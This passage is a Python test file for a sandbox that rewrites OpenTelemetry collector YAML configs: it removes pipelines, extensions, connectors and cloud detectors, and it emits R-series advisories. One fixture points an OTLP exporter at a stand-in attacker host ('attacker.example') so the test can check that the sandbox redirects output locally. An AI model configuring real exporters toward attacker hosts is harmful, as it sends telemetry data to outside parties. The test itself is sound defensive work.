"""The sandbox's mutations (R-105 is tested in `tests/test_security_fixes.py`,
against the validator's neutraliser)."""

from __future__ import annotations

from pathlib import Path
from textwrap import dedent

from ruamel.yaml import YAML

from app.yaml_mutations import (
    FILE_OUT_NAME,
    OTLP_IN_NAME,
    MutationAdvisory,
    MutationContext,
    drop_non_target_pipelines,
    mutate_for_operator_test,
    mutate_for_otlp_replay,
    processor_needs_k8s,
    rewrite_k8s_auth,
    strip_cloud_detectors,
    strip_connectors,
    strip_extensions,
    strip_in_cluster_detectors,
    sub_exporters,
    sub_receivers_otlp,
)


def _parse(s: str) -> dict:
    return YAML().load(s)


def _ids(advisories: list[MutationAdvisory]) -> list[str]:
    return [a.id for a in advisories]


# ---------------------------------------------------------------------------
# Shared-primitive coverage via OTLP-replay orchestrator
# ---------------------------------------------------------------------------


def test_otlp_replay_drops_pipelines_of_other_signals() -> None:
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {}
        exporters: {debug: {}}
        service:
          pipelines:
            metrics: {receivers: [otlp], exporters: [debug]}
            traces: {receivers: [otlp], exporters: [debug]}
            logs: {receivers: [otlp], exporters: [debug]}
        """
    )

    out, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out.json"), 4318
    )
    doc = _parse(out)

    assert list(doc["service"]["pipelines"]) == ["metrics"]

    # R-005 fires; details lists which pipelines were dropped.
    drop = next(a for a in advisories if a.id == "R-005")
    assert drop.severity == "caution"
    assert sorted(drop.details["dropped_pipelines"]) == ["logs", "traces"]
    assert drop.details["target_signal"] == "metrics"
    assert drop.details["mode"] == "signal_type"


def test_otlp_replay_target_pipeline_keeps_only_selected_same_signal() -> None:
    # Issue #248: a connector-linked traces fan-out. Without a target the
    # sandbox keeps BOTH traces pipelines and unions their output; with a
    # target it keeps only the one the user picked.
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {transform/sanitize: {}, tail_sampling: {}}
        exporters: {otlp/traces: {}}
        connectors: {forward/sampled: {}, spanmetrics: {}}
        service:
          pipelines:
            traces/in:
              receivers: [otlp]
              processors: [transform/sanitize]
              exporters: [spanmetrics, forward/sampled]
            traces/sampled:
              receivers: [forward/sampled]
              processors: [tail_sampling]
              exporters: [otlp/traces]
            metrics:
              receivers: [spanmetrics]
              exporters: [otlp/traces]
        """
    )

    out, advisories = mutate_for_otlp_replay(
        src, "traces", Path("/tmp/out.json"), 4318, target_pipeline="traces/in"
    )
    doc = _parse(out)

    # Only the picked pipeline survives — the sibling same-signal pipeline
    # (traces/sampled) and the cross-signal metrics pipeline are both gone.
    assert list(doc["service"]["pipelines"]) == ["traces/in"]
    # And it's been rewired to the sandbox endpoints, so its output is a
    # single clean envelope rather than a union of independent chains.
    assert doc["service"]["pipelines"]["traces/in"]["receivers"] == [OTLP_IN_NAME]
    assert doc["service"]["pipelines"]["traces/in"]["exporters"] == [FILE_OUT_NAME]

    drop = next(a for a in advisories if a.id == "R-005")
    assert drop.severity == "caution"
    assert drop.details["mode"] == "single_pipeline"
    assert drop.details["target_pipeline"] == "traces/in"
    assert sorted(drop.details["dropped_pipelines"]) == ["metrics", "traces/sampled"]


def test_otlp_replay_target_pipeline_stale_name_falls_back_to_signal_filter() -> None:
    # A target that no longer exists in the config (config edited after the
    # run was queued) must not strip everything to zero pipelines — fall back
    # to keeping all same-signal pipelines so the collector still starts.
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {}
        exporters: {debug: {}}
        service:
          pipelines:
            traces/in: {receivers: [otlp], exporters: [debug]}
            traces/sampled: {receivers: [otlp], exporters: [debug]}
            metrics: {receivers: [otlp], exporters: [debug]}
        """
    )

    out, advisories = mutate_for_otlp_replay(
        src, "traces", Path("/tmp/out.json"), 4318, target_pipeline="traces/gone"
    )
    doc = _parse(out)

    assert sorted(doc["service"]["pipelines"]) == ["traces/in", "traces/sampled"]
    drop = next(a for a in advisories if a.id == "R-005")
    assert drop.details["mode"] == "signal_type"
    assert drop.details["dropped_pipelines"] == ["metrics"]


def test_otlp_replay_target_pipeline_sole_pipeline_no_advisory() -> None:
    # Picking the only pipeline drops nothing → no R-005 advisory.
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {}
        exporters: {debug: {}}
        service:
          pipelines:
            traces/in: {receivers: [otlp], exporters: [debug]}
        """
    )

    _, advisories = mutate_for_otlp_replay(
        src, "traces", Path("/tmp/out.json"), 4318, target_pipeline="traces/in"
    )
    assert not [a for a in advisories if a.id == "R-005"]


def test_otlp_replay_strips_extensions_and_disables_telemetry_metrics() -> None:
    src = dedent(
        """
        extensions:
          health_check:
            endpoint: 0.0.0.0:13133
          pprof:
            endpoint: 0.0.0.0:1777
        receivers: {otlp: {}}
        exporters: {debug: {}}
        service:
          extensions: [health_check, pprof]
          telemetry:
            metrics:
              level: detailed
              address: 0.0.0.0:8888
          pipelines:
            metrics: {receivers: [otlp], exporters: [debug]}
        """
    )

    out, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out.json"), 4318
    )
    doc = _parse(out)

    assert "extensions" not in doc
    assert "extensions" not in doc["service"]
    assert doc["service"]["telemetry"] == {"metrics": {"level": "none"}}

    # R-003 fires with the original extension names. R-004 now also fires
    # because the user set `service.telemetry.metrics` — they should know we
    # wiped their config to avoid the :8888 port collision. Pre-fix R-004 was
    # silent and a user who'd set a custom level had no way to tell their
    # config wasn't active during the test.
    strip = next(a for a in advisories if a.id == "R-003")
    assert sorted(strip.details["removed_extensions"]) == ["health_check", "pprof"]
    r004 = next(a for a in advisories if a.id == "R-004")
    assert r004.details["original_telemetry"]["metrics"]["level"] == "detailed"


def test_otlp_replay_keeps_named_pipelines_of_matching_signal() -> None:
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {batch: {}}
        exporters: {debug: {}}
        service:
          pipelines:
            metrics/foo:
              receivers: [otlp]
              processors: [batch]
              exporters: [debug]
            traces/bar:
              receivers: [otlp]
              exporters: [debug]
        """
    )

    out, _ = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out.json"), 4318
    )
    doc = _parse(out)

    assert list(doc["service"]["pipelines"]) == ["metrics/foo"]
    assert doc["service"]["pipelines"]["metrics/foo"]["processors"] == ["batch"]


# ---------------------------------------------------------------------------
# OTLP-replay orchestrator
# ---------------------------------------------------------------------------


def test_otlp_replay_installs_otlp_http_listener_at_chosen_port() -> None:
    src = dedent(
        """
        receivers:
          filelog: {include: [/var/log/*.log]}
        processors:
          batch: {}
        exporters:
          otlphttp: {endpoint: https://example/}
        service:
          pipelines:
            logs:
              receivers: [filelog]
              processors: [batch]
              exporters: [otlphttp]
        """
    )

    out, advisories = mutate_for_otlp_replay(
        src, "logs", Path("/tmp/out.json"), 54321
    )
    doc = _parse(out)

    assert list(doc["receivers"]) == [OTLP_IN_NAME]
    assert (
        doc["receivers"][OTLP_IN_NAME]["protocols"]["http"]["endpoint"]
        == "127.0.0.1:54321"
    )
    assert list(doc["exporters"]) == [FILE_OUT_NAME]

    # The user's pipeline is rewired to point at sandbox components.
    p = doc["service"]["pipelines"]["logs"]
    assert p["receivers"] == [OTLP_IN_NAME]
    assert p["exporters"] == [FILE_OUT_NAME]
    assert p["processors"] == ["batch"]

    # R-001 advisory references the user's original receiver.
    r001 = next(a for a in advisories if a.id == "R-001")
    assert "filelog" in r001.message
    assert r001.details["original_receivers"] == ["filelog"]
    assert r001.details["test_receiver"] == OTLP_IN_NAME


# ---------------------------------------------------------------------------
# Primitive-level behavior: advisories fire only when something changed
# ---------------------------------------------------------------------------


def test_strip_extensions_no_advisory_when_input_has_none() -> None:
    doc = {"service": {}}
    advisories: list[MutationAdvisory] = []
    strip_extensions(doc, MutationContext("metrics", Path("/tmp/o")), advisories)
    assert advisories == []


def test_drop_non_target_pipelines_no_advisory_when_only_target_present() -> None:
    doc = {
        "service": {
            "pipelines": {
                "metrics": {"receivers": ["otlp"]},
                "metrics/foo": {"receivers": ["otlp"]},
            }
        }
    }
    advisories: list[MutationAdvisory] = []
    drop_non_target_pipelines(
        doc, MutationContext("metrics", Path("/tmp/o")), advisories
    )
    assert advisories == []
    assert sorted(doc["service"]["pipelines"]) == ["metrics", "metrics/foo"]


def test_sub_receivers_otlp_no_advisory_on_empty_input() -> None:
    doc: dict = {}
    advisories: list[MutationAdvisory] = []
    sub_receivers_otlp(
        doc, MutationContext("logs", Path("/tmp/o"), otlp_port=4318), advisories
    )
    assert advisories == []
    assert OTLP_IN_NAME in doc["receivers"]


def test_sub_exporters_no_advisory_on_empty_input() -> None:
    doc: dict = {}
    advisories: list[MutationAdvisory] = []
    sub_exporters(doc, MutationContext("logs", Path("/tmp/o")), advisories)
    assert advisories == []
    assert FILE_OUT_NAME in doc["exporters"]


# ---------------------------------------------------------------------------
# k8s auth rewrite (R-100) + needs-k8s helper
# ---------------------------------------------------------------------------


def test_processor_needs_k8s_true_for_k8sattributes() -> None:
    src = dedent(
        """
        receivers: {otlp: {}}
        processors:
          k8sattributes: {auth_type: serviceAccount}
          batch: {}
        exporters: {debug: {}}
        service: {pipelines: {logs: {receivers: [otlp], exporters: [debug]}}}
        """
    )
    assert processor_needs_k8s(src) is True


def test_processor_needs_k8s_true_for_named_instance() -> None:
    """`/instance` suffix should match the base name."""
    src = dedent(
        """
        receivers: {otlp: {}}
        processors:
          k8s_attributes/foo: {auth_type: serviceAccount}
        exporters: {debug: {}}
        """
    )
    assert processor_needs_k8s(src) is True


def test_processor_needs_k8s_false_when_only_pure_processors() -> None:
    src = dedent(
        """
        receivers: {otlp: {}}
        processors: {batch: {}, memory_limiter: {}, redaction: {}}
        exporters: {debug: {}}
        """
    )
    assert processor_needs_k8s(src) is False


def test_rewrite_k8s_auth_serviceaccount_to_kubeconfig() -> None:
    """The original failing case: serviceAccount → kubeConfig with R-100."""
    doc = {
        "processors": {
            "k8sattributes": {
                "auth_type": "serviceAccount",
                "extract": {"metadata": ["k8s.namespace.name"]},
            }
        }
    }
    advisories: list[MutationAdvisory] = []
    rewrite_k8s_auth(doc, MutationContext("logs", Path("/tmp/o")), advisories)

    assert doc["processors"]["k8sattributes"]["auth_type"] == "kubeConfig"
    # The other config keys are preserved.
    assert doc["processors"]["k8sattributes"]["extract"] == {
        "metadata": ["k8s.namespace.name"]
    }
    r100 = next(a for a in advisories if a.id == "R-100")
    assert r100.severity == "warn"
    assert "k8sattributes" in r100.message
    assert r100.details["from_auth_type"] == "serviceAccount"
    assert r100.details["to_auth_type"] == "kubeConfig"


def test_rewrite_k8s_auth_implicit_default_also_rewritten() -> None:
    """`auth_type` defaults to serviceAccount when absent — same problem,
    must get the same fix."""
    doc = {"processors": {"k8sattributes": {}}}
    advisories: list[MutationAdvisory] = []
    rewrite_k8s_auth(doc, MutationContext("logs", Path("/tmp/o")), advisories)

    assert doc["processors"]["k8sattributes"]["auth_type"] == "kubeConfig"
    assert any(a.id == "R-100" for a in advisories)


def test_rewrite_k8s_auth_already_kubeconfig_is_noop() -> None:
    """Don't disturb users who already use kubeConfig — no advisory either."""
    doc = {"processors": {"k8sattributes": {"auth_type": "kubeConfig"}}}
    advisories: list[MutationAdvisory] = []
    rewrite_k8s_auth(doc, MutationContext("logs", Path("/tmp/o")), advisories)

    assert doc["processors"]["k8sattributes"]["auth_type"] == "kubeConfig"
    assert advisories == []


def test_rewrite_k8s_auth_no_advisory_when_no_k8s_processors() -> None:
    doc = {"processors": {"batch": {}, "memory_limiter": {}}}
    advisories: list[MutationAdvisory] = []
    rewrite_k8s_auth(doc, MutationContext("logs", Path("/tmp/o")), advisories)

    assert advisories == []
    # Pure processors are untouched.
    assert "auth_type" not in doc["processors"]["batch"]


def test_otlp_orchestrator_emits_r100_for_users_failing_yaml() -> None:
    """The original failing YAML from the user's bug report. After mutation
    the k8sattributes auth_type must be kubeConfig and R-100 must fire."""
    src = dedent(
        """
        receivers:
          filelog:
            include: [/var/log/pods/*/*/*.log]
        processors:
          k8sattributes:
            auth_type: serviceAccount
            extract:
              metadata: [k8s.namespace.name, k8s.pod.name]
            pod_association:
              - sources:
                  - from: connection
          batch: {}
        exporters:
          otlphttp: {endpoint: http://localhost:4318}
        service:
          pipelines:
            logs:
              receivers: [filelog]
              processors: [k8sattributes, batch]
              exporters: [otlphttp]
        """
    )
    out, advisories = mutate_for_otlp_replay(
        src, "logs", Path("/tmp/o"), 54321
    )
    doc = _parse(out)

    assert doc["processors"]["k8sattributes"]["auth_type"] == "kubeConfig"
    assert "R-100" in _ids(advisories)


def test_advisory_ids_are_stable_format() -> None:
    """If an advisory ID format ever changes, this test catches it before
    the frontend's stable references break. The contract is "R-XXX" or
    "S-XXX" — three-digit numeric suffix, capital prefix."""
    src = dedent(
        """
        receivers: {kubeletstats: {}}
        exporters: {otlphttp: {}}
        extensions: {pprof: {}}
        service:
          extensions: [pprof]
          pipelines:
            metrics: {receivers: [kubeletstats], exporters: [otlphttp]}
            traces: {receivers: [kubeletstats], exporters: [otlphttp]}
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out"), 4318
    )
    import re

    for a in advisories:
        assert re.fullmatch(r"[RS]-\d{3}", a.id), f"bad advisory id: {a.id}"
        assert a.severity in ("info", "caution", "warn")
        assert a.message


# ---------------------------------------------------------------------------
# R-101: strip_in_cluster_detectors. Trim k8snode out; if it was the only
# detector, drop the whole processor and unwire it from pipelines (an empty
# detectors list breaks collector startup on some otelcol-contrib versions).
# ---------------------------------------------------------------------------


def _ctx() -> MutationContext:
    return MutationContext(signal_type="metrics", output_path=Path("/tmp/out"))


def test_r101_trims_k8snode_when_other_detectors_remain() -> None:
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [k8snode, env]
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_in_cluster_detectors(doc, _ctx(), advisories)

    # Processor stays; only k8snode is gone.
    assert "resourcedetection" in doc["processors"]
    assert doc["processors"]["resourcedetection"]["detectors"] == ["env"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == [
        "resourcedetection"
    ]
    assert _ids(advisories) == ["R-101"]
    details = advisories[0].details
    assert details["trimmed"] == [
        {"processor": "resourcedetection", "removed_detectors": ["k8snode"]}
    ]
    assert details["removed_processors"] == []


def test_r101_removes_processor_when_only_k8snode_present() -> None:
    """The empty-detectors case the fix is for: drop the processor entirely
    so the collector doesn't refuse to start, and unwire it from pipelines
    so the pipeline doesn't reference a missing component."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [k8snode]
              batch: {}
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection, batch]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_in_cluster_detectors(doc, _ctx(), advisories)

    assert "resourcedetection" not in doc["processors"]
    assert "batch" in doc["processors"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == ["batch"]
    assert _ids(advisories) == ["R-101"]
    details = advisories[0].details
    assert details["trimmed"] == []
    assert details["removed_processors"] == [
        {"processor": "resourcedetection", "removed_detectors": ["k8snode"]}
    ]
    assert "removed" in advisories[0].message.lower()


def test_r101_unwires_removed_processor_from_every_pipeline() -> None:
    """Multi-pipeline case: every pipeline that referenced the dropped
    processor must lose the reference, not just the first one."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [k8snode]
              batch: {}
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection, batch]
                logs:
                  processors: [batch, resourcedetection]
                traces:
                  processors: [batch]
            """
        )
    )
    strip_in_cluster_detectors(doc, _ctx(), [])

    pipelines = doc["service"]["pipelines"]
    assert pipelines["metrics"]["processors"] == ["batch"]
    assert pipelines["logs"]["processors"] == ["batch"]
    assert pipelines["traces"]["processors"] == ["batch"]


def test_r101_handles_instance_suffixed_processors() -> None:
    """`resourcedetection/foo` and `resourcedetection/bar` are independent
    instances. Trim one, drop the other when applicable."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection/keep:
                detectors: [k8snode, env]
              resourcedetection/drop:
                detectors: [k8snode]
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection/keep, resourcedetection/drop]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_in_cluster_detectors(doc, _ctx(), advisories)

    assert doc["processors"]["resourcedetection/keep"]["detectors"] == ["env"]
    assert "resourcedetection/drop" not in doc["processors"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == [
        "resourcedetection/keep"
    ]
    details = advisories[0].details
    assert {t["processor"] for t in details["trimmed"]} == {"resourcedetection/keep"}
    assert {r["processor"] for r in details["removed_processors"]} == {
        "resourcedetection/drop"
    }


# ---------------------------------------------------------------------------
# R-004: force_telemetry_off. Sandbox always overwrites service.telemetry to
# avoid the :8888 Prometheus port collision; users whose telemetry block had
# real content should see an advisory so they know their config wasn't active.
# ---------------------------------------------------------------------------


def test_r004_emits_advisory_when_user_set_telemetry() -> None:
    src = dedent(
        """
        receivers: {kubeletstats: {}}
        exporters: {otlphttp: {}}
        service:
          telemetry:
            logs: {level: debug}
            metrics: {level: detailed}
          pipelines:
            metrics: {receivers: [kubeletstats], exporters: [otlphttp]}
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out"), 4318
    )
    r004 = [a for a in advisories if a.id == "R-004"]
    assert len(r004) == 1
    assert r004[0].severity == "info"
    assert "logs" in str(r004[0].details["original_telemetry"])


def test_r004_silent_when_no_user_telemetry() -> None:
    """No telemetry block in the user's YAML → no R-004 advisory. The
    rewrite still happens internally; we just don't bother the user with
    a note about something they didn't set."""
    src = dedent(
        """
        receivers: {kubeletstats: {}}
        exporters: {otlphttp: {}}
        service:
          pipelines:
            metrics: {receivers: [kubeletstats], exporters: [otlphttp]}
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out"), 4318
    )
    assert not any(a.id == "R-004" for a in advisories)


def test_r004_silent_for_empty_telemetry_block() -> None:
    """An empty telemetry: {} block is still effectively the default — don't
    spam the user with an advisory."""
    src = dedent(
        """
        receivers: {kubeletstats: {}}
        exporters: {otlphttp: {}}
        service:
          telemetry: {}
          pipelines:
            metrics: {receivers: [kubeletstats], exporters: [otlphttp]}
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out"), 4318
    )
    assert not any(a.id == "R-004" for a in advisories)


def test_r101_silent_when_no_in_cluster_detectors() -> None:
    """If nothing changes, no advisory is emitted."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [env, system]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_in_cluster_detectors(doc, _ctx(), advisories)
    assert advisories == []
    assert doc["processors"]["resourcedetection"]["detectors"] == ["env", "system"]


# ---------------------------------------------------------------------------
# R-103: strip_cloud_detectors. Cloud-metadata detectors (gcp, ec2, azure, …)
# would block on TCP connect for their full timeout against an unreachable
# metadata service — the sandbox can't simulate those endpoints, and during
# the timeout the testing container is making real outbound HTTP. Strip them
# before the subprocess spawns. Shape mirrors R-101.
# ---------------------------------------------------------------------------


def test_r103_trims_cloud_detectors_when_others_remain() -> None:
    """Mixed-list case: keep env/system, strip the cloud ones."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [env, gcp, ec2, system]
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_cloud_detectors(doc, _ctx(), advisories)

    assert "resourcedetection" in doc["processors"]
    assert doc["processors"]["resourcedetection"]["detectors"] == ["env", "system"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == [
        "resourcedetection"
    ]
    assert _ids(advisories) == ["R-103"]
    assert advisories[0].severity == "warn"
    details = advisories[0].details
    assert details["trimmed"] == [
        {"processor": "resourcedetection", "removed_detectors": ["gcp", "ec2"]}
    ]
    assert details["removed_processors"] == []


def test_r103_removes_processor_when_only_cloud_detectors_present() -> None:
    """If every detector is cloud-only, the processor itself is dropped and
    unwired from every pipeline that referenced it — leaving
    ``detectors: []`` would break collector startup on some versions."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [gcp, ec2, azure]
              batch: {}
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection, batch]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_cloud_detectors(doc, _ctx(), advisories)

    assert "resourcedetection" not in doc["processors"]
    assert "batch" in doc["processors"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == ["batch"]
    assert _ids(advisories) == ["R-103"]
    details = advisories[0].details
    assert details["trimmed"] == []
    assert details["removed_processors"] == [
        {
            "processor": "resourcedetection",
            "removed_detectors": ["gcp", "ec2", "azure"],
        }
    ]
    assert "removed" in advisories[0].message.lower()


def test_r103_unwires_removed_processor_from_every_pipeline() -> None:
    """Multi-pipeline: every pipeline that referenced the dropped processor
    must lose the reference, not just the first one."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [aws, gcp]
              batch: {}
            service:
              pipelines:
                metrics:
                  processors: [resourcedetection, batch]
                logs:
                  processors: [batch, resourcedetection]
                traces:
                  processors: [batch]
            """
        )
    )
    strip_cloud_detectors(doc, _ctx(), [])

    pipelines = doc["service"]["pipelines"]
    assert pipelines["metrics"]["processors"] == ["batch"]
    assert pipelines["logs"]["processors"] == ["batch"]
    assert pipelines["traces"]["processors"] == ["batch"]


def test_r103_handles_instance_suffixed_processors() -> None:
    """`resourcedetection/cloud` and `resourcedetection/host` are independent
    instances; treat each independently."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection/host:
                detectors: [env, gcp]
              resourcedetection/cloud_only:
                detectors: [ec2, azure]
            service:
              pipelines:
                metrics:
                  processors:
                    [resourcedetection/host, resourcedetection/cloud_only]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_cloud_detectors(doc, _ctx(), advisories)

    assert doc["processors"]["resourcedetection/host"]["detectors"] == ["env"]
    assert "resourcedetection/cloud_only" not in doc["processors"]
    assert doc["service"]["pipelines"]["metrics"]["processors"] == [
        "resourcedetection/host"
    ]
    details = advisories[0].details
    assert {t["processor"] for t in details["trimmed"]} == {
        "resourcedetection/host"
    }
    assert {r["processor"] for r in details["removed_processors"]} == {
        "resourcedetection/cloud_only"
    }


def test_r103_silent_when_no_cloud_detectors() -> None:
    """If nothing changes, no advisory is emitted — and pure-local
    detectors like env / system / docker pass through untouched."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [env, system, docker]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_cloud_detectors(doc, _ctx(), advisories)
    assert advisories == []
    assert doc["processors"]["resourcedetection"]["detectors"] == [
        "env",
        "system",
        "docker",
    ]


def test_r103_does_not_strip_k8snode() -> None:
    """R-101 handles k8snode; R-103 must NOT touch it. Run R-103 in isolation
    and verify k8snode survives — otherwise the two rules would double-strip
    and we'd lose the R-101 advisory's specificity (the user thinks their
    k8snode failure is a cloud-detector issue)."""
    doc = _parse(
        dedent(
            """
            processors:
              resourcedetection:
                detectors: [env, k8snode, gcp]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_cloud_detectors(doc, _ctx(), advisories)

    # k8snode survives; only gcp is gone.
    assert doc["processors"]["resourcedetection"]["detectors"] == [
        "env",
        "k8snode",
    ]
    details = advisories[0].details
    assert details["trimmed"] == [
        {"processor": "resourcedetection", "removed_detectors": ["gcp"]}
    ]


def test_r103_covers_all_documented_cloud_detectors() -> None:
    """Make sure every detector named in SANDBOX_REWRITES.md R-103 is
    actually stripped — keeps the doc and the code in lockstep."""
    documented = [
        "gcp", "gke", "aws", "ec2", "ecs", "eks",
        "azure", "aks", "elasticbeanstalk", "lambda",
    ]
    doc = _parse(
        dedent(
            f"""
            processors:
              resourcedetection:
                detectors: {documented}
            """
        )
    )
    strip_cloud_detectors(doc, _ctx(), [])
    # Every documented detector should be gone → processor removed entirely.
    assert "resourcedetection" not in doc["processors"], (
        "At least one documented cloud detector was not in _CLOUD_DETECTORS; "
        "the SANDBOX_REWRITES.md R-103 list and the code drifted out of sync."
    )


# Orchestrator wiring: an end-to-end pipeline through mutate_for_*_replay
# must produce an R-103 advisory when cloud detectors are present.


def test_orchestrator_emits_r103_for_cloud_detectors_otlp_replay() -> None:
    src = dedent(
        """
        receivers: {otlp: {protocols: {http: {endpoint: 0.0.0.0:4318}}}}
        processors:
          resourcedetection: {detectors: [env, gcp, ec2]}
          batch: {}
        exporters: {otlphttp: {endpoint: https://attacker.example/}}
        service:
          pipelines:
            metrics:
              receivers: [otlp]
              processors: [resourcedetection, batch]
              exporters: [otlphttp]
        """
    )
    _, advisories = mutate_for_otlp_replay(src, "metrics", Path("/tmp/out"), 9999)
    r103 = [a for a in advisories if a.id == "R-103"]
    assert len(r103) == 1
    assert r103[0].severity == "warn"
    assert r103[0].details["trimmed"] == [
        {"processor": "resourcedetection", "removed_detectors": ["gcp", "ec2"]}
    ]


# ---------------------------------------------------------------------------
# R-007: strip_connectors. The sandbox tests one pipeline's processor chain
# at a time and can't faithfully exercise connector logic that spans
# pipelines or signal types — drop the connectors: block wholesale so users
# don't see half-mutated configs where a connector points at a dropped
# pipeline or gets orphaned in the connectors: block.
# ---------------------------------------------------------------------------


def test_r007_strips_top_level_connectors_block() -> None:
    doc = _parse(
        dedent(
            """
            connectors:
              spanmetrics: {namespace: span.metrics}
              forward: {}
            processors:
              batch: {}
            service:
              pipelines:
                traces:
                  receivers: [otlp]
                  processors: [batch]
                  exporters: [otlphttp]
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_connectors(doc, _ctx(), advisories)

    assert "connectors" not in doc
    assert _ids(advisories) == ["R-007"]
    assert advisories[0].severity == "info"
    # Sorted alphabetically so the advisory message is deterministic across runs.
    assert advisories[0].details["removed_connectors"] == ["forward", "spanmetrics"]
    assert "spanmetrics" in advisories[0].message
    assert "forward" in advisories[0].message


def test_r007_silent_when_no_connectors_block() -> None:
    """No connectors: block at all → no advisory, no doc mutation."""
    doc = _parse(
        dedent(
            """
            receivers: {otlp: {}}
            exporters: {otlphttp: {}}
            service:
              pipelines:
                traces: {receivers: [otlp], exporters: [otlphttp]}
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_connectors(doc, _ctx(), advisories)
    assert advisories == []
    assert "connectors" not in doc  # never was


def test_r007_silent_when_connectors_block_empty() -> None:
    """An empty connectors: {} block — common when the user templated their
    YAML but didn't add any — shouldn't produce an advisory either."""
    doc = _parse(
        dedent(
            """
            connectors: {}
            receivers: {otlp: {}}
            exporters: {otlphttp: {}}
            service:
              pipelines:
                traces: {receivers: [otlp], exporters: [otlphttp]}
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_connectors(doc, _ctx(), advisories)
    assert advisories == []


def test_r007_handles_instance_suffixed_connectors() -> None:
    """`spanmetrics/api` and `spanmetrics/worker` are independent connector
    instances. Both must be stripped, both must show up in the advisory."""
    doc = _parse(
        dedent(
            """
            connectors:
              spanmetrics/api: {namespace: api.metrics}
              spanmetrics/worker: {namespace: worker.metrics}
            """
        )
    )
    advisories: list[MutationAdvisory] = []
    strip_connectors(doc, _ctx(), advisories)
    assert "connectors" not in doc
    assert advisories[0].details["removed_connectors"] == [
        "spanmetrics/api",
        "spanmetrics/worker",
    ]


def test_orchestrator_strips_connectors_and_cleans_pipeline_references_otlp() -> None:
    """End-to-end: a YAML with a connector wired into a pipeline ends up with
    no connector references anywhere after the OTLP-replay orchestrator runs.
    Confirms the swap_pipeline_endpoints cleanup happens implicitly."""
    src = dedent(
        """
        connectors:
          spanmetrics: {namespace: span.metrics}
        receivers: {otlp: {}}
        processors: {batch: {}}
        exporters: {otlphttp: {}}
        service:
          pipelines:
            traces:
              receivers: [otlp]
              processors: [batch]
              exporters: [spanmetrics, otlphttp]
            metrics:
              receivers: [spanmetrics]
              exporters: [otlphttp]
        """
    )
    out, advisories = mutate_for_otlp_replay(src, "traces", Path("/tmp/out"), 9999)

    doc = _parse(out)
    # Top-level connectors block is gone.
    assert "connectors" not in doc
    # The only surviving pipeline (traces) has had its receivers/exporters
    # arrays rewritten to the sandbox components — no leftover spanmetrics
    # reference.
    traces = doc["service"]["pipelines"]["traces"]
    assert traces["receivers"] == [OTLP_IN_NAME]
    assert traces["exporters"] == [FILE_OUT_NAME]
    # The cross-signal metrics pipeline is dropped by R-005, taking the
    # other spanmetrics reference with it.
    assert "metrics" not in doc["service"]["pipelines"]
    # R-007 advisory is present.
    r007 = [a for a in advisories if a.id == "R-007"]
    assert len(r007) == 1
    assert r007[0].details["removed_connectors"] == ["spanmetrics"]


def test_orchestrator_strips_connectors_otlp_replay_multi_connector() -> None:
    """The OTLP-replay orchestrator must strip connectors (including multiple
    instances) — covers the shared strip_connectors primitive via the
    orchestrator end-to-end path."""
    src = dedent(
        """
        connectors:
          forward: {}
          routing:
            table:
              - statement: route() where attributes["env"] == "prod"
                pipelines: [traces/prod]
        receivers: {kubeletstats: {}}
        exporters: {otlphttp: {}}
        service:
          pipelines:
            traces:
              receivers: [kubeletstats]
              exporters: [routing]
            traces/prod:
              receivers: [routing]
              exporters: [otlphttp]
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "traces", Path("/tmp/out"), 4318
    )
    r007 = [a for a in advisories if a.id == "R-007"]
    assert len(r007) == 1
    assert r007[0].details["removed_connectors"] == ["forward", "routing"]


def test_orchestrator_emits_r103_for_cloud_detectors_otlp_replay_remove() -> None:
    """When the only detector is cloud-only the processor is removed entirely.
    Covers the shared strip_cloud_detectors remove-path via the orchestrator."""
    src = dedent(
        """
        receivers: {kubeletstats: {}}
        processors:
          resourcedetection: {detectors: [gcp]}
        exporters: {otlphttp: {}}
